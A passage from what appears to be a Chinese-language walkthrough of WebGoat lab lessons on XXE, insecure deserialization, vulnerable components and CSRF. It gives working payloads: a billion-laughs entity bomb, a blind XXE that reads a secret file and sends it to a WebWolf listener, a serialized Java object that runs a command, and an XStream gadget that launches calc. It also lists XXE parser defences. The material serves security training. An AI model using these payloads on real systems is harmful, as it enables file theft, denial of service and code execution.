<div class="highlight"><pre><span></span><code><span class="k">&lt;!ENTITY</span> <span class="ni">实体名称</span> <span class="s2">&quot;实体的值&quot;</span><span class="k">&gt;</span>
</code></pre></div>
<p>例如：以下定义了一个<code>name</code>内部实体，并在文档中引用。文档解析时，会使用<code>John Smith</code>代替<code>&amp;name;</code></p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE author [</span>
<span class="cp">  &lt;!ENTITY name &quot;John Smith&quot;&gt;</span>
]&gt;
<span class="nt">&lt;author&gt;</span><span class="ni">&amp;name;</span><span class="nt">&lt;/author&gt;</span>
</code></pre></div>
<ul>
<li><code>External Entity</code>，外部实体</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="k">&lt;!ENTITY</span> <span class="ni">实体名称</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;URI/URL&quot;</span><span class="k">&gt;</span>
</code></pre></div>
<p>例如：</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!ENTITY a SYSTEM &quot;http://example.com/xxe.dtd&quot;&gt;</span>
<span class="cp">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
</code></pre></div>
<ul>
<li><code>Parameter Entity</code>，参数实体</li>
</ul>
<h5 id="xxe-injection"><code>XXE Injection</code></h5>
<p><code>XXE</code>注入：<code>XML</code>外部实体注入。实体<code>(Entities)</code>作为类似变量的存在，可以存储数据，也能从本地文件或远程网络资源中调用相关数据作为后续实体引用。<code>XXE</code>注入分类：</p>
<ul>
<li>带内实体注入攻击，<code>Inband</code></li>
<li>基于错误的实体注入攻击，<code>ERROR</code></li>
<li>带外实体注入攻击，<code>OOB</code></li>
</ul>
<h5 id="xxe-dos"><code>XXE DOS</code>攻击</h5>
<p>例如：以下代码中定义实体<code>lol9</code>包含<code>10</code>个<code>lol8</code>，而<code>lol8</code>也是实体，包含<code>10</code>个<code>lol7</code>，以此类推，<code>lol9</code>包含 $10^{9}$个<code>lol</code>，系统解析和处理此文档需要消耗大量资源（至少<code>3G</code>内存），严重情况下将导致系统卡死，拒绝提供服务。</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE lolz [</span>
<span class="cp"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span>
 <span class="cp">&lt;!ELEMENT lolz (#PCDATA)&gt;</span>
 <span class="cp">&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span>
 <span class="cp">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span>
]&gt;
<span class="nt">&lt;lolz&gt;</span><span class="ni">&amp;lol9;</span><span class="nt">&lt;/lolz&gt;</span>
</code></pre></div>
<p><code>Blind XXE</code></p>
<p>即无回显的<code>XXE</code>，有些情况下即便攻击生效了，可能字段没有回显在页面上。或者你读取的内容存在非法的<code>XML</code>字符，导致文档解析失败。</p>
<p>题目：<code>Blind XXE assignment</code></p>
<p><img alt="image-20221230165801209" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221230165801209.png" /></p>
<p>本地先创建一个文件<code>xxe.dtd</code>，文件内容如下：</p>
<div class="highlight"><pre><span></span><code><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">payload</span>  <span class="s2">&quot;&lt;!ENTITY attack SYSTEM &#39;http://127.0.0.1:9090/landing?text=%file;&#39;&gt;&quot;</span><span class="k">&gt;</span>
</code></pre></div>
<p>将文件上传到<code>WebWolf</code>系统的<code>Files</code>模块，得到文件的链接：<code>http://127.0.0.1:9090/files/admin666/xxe.dtd</code></p>
<p>回到<code>WebGoat</code>系统，在页面输入评论，点击提交按钮，抓包，将提交的数据部分内容改为如下内容后放包</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp">&lt;!ENTITY % file SYSTEM &quot;file:///C:\Users\robin/.webgoat-@project.version@//XXE/secret.txt&quot;&gt;</span>
<span class="cp">&lt;!ENTITY % test SYSTEM &quot;http://127.0.0.1:9090/files/admin666/xxe.dtd&quot;&gt;</span>
%test;
%payload;
]&gt;
<span class="nt">&lt;comment&gt;</span>
<span class="nt">&lt;text&gt;</span><span class="ni">&amp;attack;</span><span class="nt">&lt;/text&gt;&lt;/comment&gt;</span>
</code></pre></div>
<p><img alt="image-20221230170324032" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221230170324032.png" /></p>
<p>再回到<code>WebWolf</code>的<code>Incoming requests</code>模块下查看，我们已经拿到了<code>secret.txt</code>文件的内容，将拿到的值<code>urldecode</code>解码后正常提交评论即可。</p>
<p><img alt="image-20221230170621022" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221230170621022.png" /></p>
<p><code>XXE</code>防御措施</p>
<ul>
<li>设置<code>XML</code>解析器忽略<code>DTD</code></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="n">XMLInputFactory</span><span class="w"> </span><span class="n">xif</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XMLInputFactory</span><span class="p">.</span><span class="na">newFactory</span><span class="p">();</span><span class="w"></span>
<span class="n">xif</span><span class="p">.</span><span class="na">setProperty</span><span class="p">(</span><span class="n">XMLInputFactory</span><span class="p">.</span><span class="na">SUPPORT_DTD</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w"></span>
</code></pre></div>
<ul>
<li>设置解析器支持<code>DTD</code>，但忽略外部实体</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="n">XMLInputFactory</span><span class="w"> </span><span class="n">xif</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XMLInputFactory</span><span class="p">.</span><span class="na">newFactory</span><span class="p">();</span><span class="w"></span>
<span class="n">xif</span><span class="p">.</span><span class="na">setProperty</span><span class="p">(</span><span class="n">XMLInputFactory</span><span class="p">.</span><span class="na">IS_SUPPORTING_EXTERNAL_ENTITIES</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w"></span>
<span class="n">xif</span><span class="p">.</span><span class="na">setProperty</span><span class="p">(</span><span class="n">XMLInputFactory</span><span class="p">.</span><span class="na">SUPPORT_DTD</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w"></span>
</code></pre></div>
<h4 id="insecure-direct-object-references">Insecure Direct Object References</h4>
<h4 id="insecure-deserialization">Insecure Deserialization</h4>
<p>题目：给出一个已经序列化的对象（字符串），要你将其反序列化，并修改其内容，使得页面延迟5秒响应。</p>
<p><img alt="image-20221231120505754" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221231120505754.png" /></p>
<p>查看源码：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/InsecureDeserialization/task&quot;</span><span class="p">)</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">AttackResult</span><span class="w"> </span><span class="nf">completed</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">b64token</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">before</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">after</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">delay</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">b64token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">token</span><span class="p">.</span><span class="na">replace</span><span class="p">(</span><span class="sc">&#39;-&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;+&#39;</span><span class="p">).</span><span class="na">replace</span><span class="p">(</span><span class="sc">&#39;_&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getDecoder</span><span class="p">().</span><span class="na">decode</span><span class="p">(</span><span class="n">b64token</span><span class="p">))))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">before</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">currentTimeMillis</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">o</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">VulnerableTaskHolder</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">o</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;insecure-deserialization.stringobject&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;insecure-deserialization.wrongobject&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="n">after</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">currentTimeMillis</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="p">......</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="n">delay</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">after</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">before</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">delay</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">7000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">delay</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">3000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">success</span><span class="p">().</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>先使用<code>readObject</code>反序列化，判断对象如果不是<code>VulnerableTaskHolder</code>对象类型，则返回失败；而<code>VulnerableTaskHolder</code>中恰好重写了<code>readObject</code>方法。在反序列化前后记录时间，最后判断时间差需要在<code>3~7</code>秒之间，否则也返回失败。我们继续查看<code>VulnerableTaskHolder</code>类的<code>readObject</code>方法是怎么重写的：</p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">stream</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="c1">//unserialize data so taskName and taskAction are available</span><span class="w"></span>
<span class="w">    </span><span class="n">stream</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="p">......</span><span class="w"></span>
<span class="w">    </span><span class="c1">//condition is here to prevent you from destroying the goat altogether</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">taskAction</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;sleep&quot;</span><span class="p">)</span><span class="o">||</span><span class="n">taskAction</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;ping&quot;</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">taskAction</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">22</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;about to execute: &quot;</span><span class="o">+</span><span class="n">taskAction</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">taskAction</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="w"></span>
<span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()));</span><span class="w"></span>
<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">line</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p><code>readObject</code>方法中判断<code>taskAction</code>属性是否以<code>sleep</code>或<code>ping</code>开头，并且长度小于<code>22</code>，就可以调用<code>Runtime.getRuntime().exec()</code>执行<code>taskAction</code>代码。综合以上信息来看，我们需要先构造一个<code>VulnerableTaskHolder</code>对象，设置其<code>taskAction</code>属性值为以<code>sleep</code>或<code>ping</code>开头，且执行<code>taskAction</code>命令的时间在<code>3~7</code>秒之间，并且长度小于<code>22</code>，然后将其反序列化输出字符串，最后将得到的字符串在页面提交即可。代码如下：</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="c1">// ActionName start with sleep or ping</span><span class="w"></span>
<span class="w">    </span><span class="n">VulnerableTaskHolder</span><span class="w"> </span><span class="n">task</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">VulnerableTaskHolder</span><span class="p">(</span><span class="s">&quot;Test&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ping 127.0.0.1&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serialization</span><span class="p">(</span><span class="n">task</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">result</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">deserialization</span><span class="p">(</span><span class="n">result</span><span class="p">));</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
<span class="cm">/**反序列化*/</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">deserialization</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">ByteArrayInputStream</span><span class="w"> </span><span class="n">bis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getDecoder</span><span class="p">().</span><span class="na">decode</span><span class="p">(</span><span class="n">token</span><span class="p">));</span><span class="w"></span>
<span class="w">    </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">bis</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
<span class="cm">/**序列化*/</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">serialization</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">baos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">baos</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">baos</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">());</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p><img alt="image-20221231125545275" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221231125545275.png" /></p>
<h4 id="vulnerable-components">Vulnerable Components</h4>
<div class="highlight"><pre><span></span><code>&lt;sorted-set&gt;
    &lt;string&gt;foo&lt;/string&gt;
    &lt;dynamic-proxy&gt;
        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
        &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
            &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;
                &lt;command&gt;
                    &lt;string&gt;calc&lt;/string&gt;
                &lt;/command&gt;
            &lt;/target&gt;
            &lt;action&gt;start&lt;/action&gt;
        &lt;/handler&gt;
    &lt;/dynamic-proxy&gt;
&lt;/sorted-set&gt;
</code></pre></div>
<h4 id="cross-site-request-forgeries">Cross-Site Request Forgeries</h4>
<p>直接看源码：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/csrf/feedback/message&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">produces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;application/json&quot;</span><span class="p">})</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">AttackResult</span><span class="w"> </span><span class="nf">completed</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">feedback</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">......</span><span class="w"> </span><span class="c1">//前面不重要</span><span class="w"></span>
<span class="w">    </span><span class="kt">boolean</span><span class="w"> </span><span class="n">correctCSRF</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">requestContainsWebGoatCookie</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getCookies</span><span class="p">())</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getContentType</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="n">MediaType</span><span class="p">.</span><span class="na">TEXT_PLAIN_VALUE</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">correctCSRF</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="n">hostOrRefererDifferentHost</span><span class="p">(</span><span class="n">request</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">correctCSRF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UUID</span><span class="p">.</span><span class="na">randomUUID</span><span class="p">().</span><span class="na">toString</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="n">userSessionData</span><span class="p">.</span><span class="na">setValue</span><span class="p">(</span><span class="s">&quot;csrf-feedback&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">success</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;csrf-feedback-success&quot;</span><span class="p">).</span><span class="na">feedbackArgs</span><span class="p">(</span><span class="n">flag</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">failed</span><span class="p">().</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">hostOrRefererDifferentHost</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">referer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;Referer&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;Host&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">referer</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">!</span><span class="n">referer</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">host</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

